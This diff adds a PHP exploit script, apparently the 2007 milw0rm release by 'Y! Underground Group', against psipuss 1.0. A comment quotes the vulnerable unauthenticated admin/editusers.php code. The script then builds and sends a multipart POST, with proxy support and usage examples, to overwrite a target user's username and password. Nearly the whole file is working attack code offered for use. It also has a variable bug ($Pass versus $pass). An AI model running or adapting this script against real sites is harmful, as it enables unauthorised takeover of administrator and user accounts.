@@ -1,0 +1,224 @@
+<?php
+
+/*
+
+                                                       \#'#/
+                                                       (-.-)
+                              --------------------oOO---(_)---OOo-------------------
+                              |                [ Y! Underground Group ]            |
+                              |                 [ www.dj7xpl.2600.ir ]             |
+                              |                  [ Dj7xpl @ 2600.ir ]              |
+                              ------------------------------------------------------
+
+[!] Portal :  psipuss version 1.0
+[!] Vendor :  http://www.psi-labs.com/photos_images_uploadscript.html
+[!] Author :  Dj7xpl
+[!] We Are :  Y4Ho0 -Mr.Mithridates -Sir SiSiLi -System Failure -Satanic Soulfull -And Me
+
+Vuln Code :
+
+if(isset($_POST[Are]))
+{
+$Username 				= $_POST[Username];
+$Password 				= $_POST[Password];
+$First_Name 				= $_POST[First_Name];
+$Last_Name 				= $_POST[Last_Name];
+$Email_Address 				= $_POST[Email_Address];
+$City 					= $_POST[City];
+$Zip_Code 				= $_POST[Zip_Code];
+$State 					= $_POST[State];
+$Country 				= $_POST[Country];
+$Status 				= $_POST[Status];
+$t					= time();
+
+
+$q1 = "update `users` set
+`Username` 				= '$Username' ,
+`Password` 				= '$Password' ,
+`First_Name` 				= '$First_Name' ,
+`Last_Name` 				= '$Last_Name' ,
+`Email_Address` 			= '$Email_Address' ,
+`City` 					= '$City' ,
+`Zip_Code` 				= '$Zip_Code' ,
+`State` 				= '$State' ,
+`Country` 				= '$Country' ,
+`Status` 				= '$Status'
+ where `Uid` 				= '$_GET[Uid]'";
+
+*/
+
+if ($argc<5) {
+print_r('
+-----------------------------------------------------------------------------
+
+Usage: php '.$argv[0].' Host Path User Pass Uid Options
+host:       Target server (ip/hostname)
+path:       Path To Folder
+User:       User Name 
+Pass:       New passw0rd For User
+Uid :       User ID
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+
+Example:
+php '.$argv[0].' 127.0.0.1 /psipuss/ Admin 123456 1 -P1.1.1.1:80
+
+-----------------------------------------------------------------------------
+');
+
+die;
+}
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacket($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$user=$argv[3];
+$pass=$argv[4];
+$uid=$argv[5];
+
+$port=80;
+$proxy="";
+for ($i=7; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+/*Data*/
+
+$data.='-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="Are"
+
+
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="Username"
+
+'.$user.'
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="Password"
+
+'.$Pass.'
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="First_Name"
+
+dj7xpl
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="Last_Name"
+
+dj7xpl
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="Email_Address"
+
+dj7xpl@yahoo.com
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="City"
+
+NobodyCity
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="Zip_Code"
+
+77777
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="State"
+
+aaaaaa
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="Country"
+
+Iran
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="Status"
+
+Active
+-----------------------------7d6224c08dc
+';
+
+echo "Powered By Y! Underground Group\r\n";
+echo "discovered&Coded By Dj7xpl\r\n";
+echo "Sending Data To Target ...\n";
+
+/*Sending Data*/
+$packet ="POST ".$p."admin/editusers.php?Uid=".$uid." HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacket($packet);
+sleep(1);
+echo "Change Passw0rd Now!\n";
+?>
+
+# milw0rm.com [2007-04-30]
